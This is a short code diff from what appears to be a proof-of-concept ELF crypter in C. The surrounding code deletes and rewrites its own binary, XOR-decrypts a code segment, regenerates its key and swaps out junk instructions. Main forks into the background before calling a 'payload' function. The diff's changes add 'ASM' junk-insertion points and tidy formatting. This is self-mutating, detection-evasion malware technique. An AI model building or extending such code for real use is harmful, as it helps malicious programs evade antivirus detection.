@@ -43,11 +43,11 @@ CRYPTED(CODE) void save(crypter_t *crypt)
     /* Delete the file so we can write a modified image */
     if (unlink(crypt->fname) < 0)
         DIE("unlink:");
-    if ((fd = open(crypt->fname, O_CREAT | O_TRUNC | O_RDWR,S_IRWXU)) == -1)
+    if ((fd = open(crypt->fname, O_CREAT | O_TRUNC | O_RDWR, S_IRWXU)) == -1)
         DIE("open:");
     if (write(fd, crypt->bin_content, crypt->bin_len) < 0)
         DIE("write:");
-    close (fd);
+    close(fd);
   return;
 }
 
@@ -99,6 +99,7 @@ static void decode_and_crypt(crypter_t *crypter)
     Elf64_Shdr *section = elfi_find_section(crypter->bin_content, CODE);
     int key_offset = -1;
     int key_len = -1;
+ASM
 
     /* Get ELF infos : */
     /* ELF - On crypted code */
@@ -120,12 +121,12 @@ static void decode_and_crypt(crypter_t *crypter)
     xor_segment(BIN_START + crypter->seg_offset, crypter->seg_len);
     xor_segment(crypter->bin_content + crypter->seg_offset, crypter->seg_len);
     change_section_permissions(crypter->seg_offset, crypter->seg_len, false);
-
+    ASM
     /* Give W permission on .PoC_key && rewrite key in binary && Remove W perm on .PoC_key*/
     change_section_permissions(key_offset, crypter->seg_len, true);
     generate_key(crypter->bin_content + key_offset, crypter->seg_len); // New key
     change_section_permissions(key_offset, crypter->seg_len, false);
-
+    ASM
     // ! The data's clear here, so we can look for the pattern and change it's instructions
     unsigned char **ptr_bin = (unsigned char **)&(crypter->bin_content);
     replace_junk(ptr_bin, NULL, crypter->bin_len);
@@ -174,6 +175,7 @@ int main(int ac, char const * const *av)
     if(fork())
         exit(0);
     payload(); /* 😈 */
+    ASM
     run_alone();
     return (0);
 }
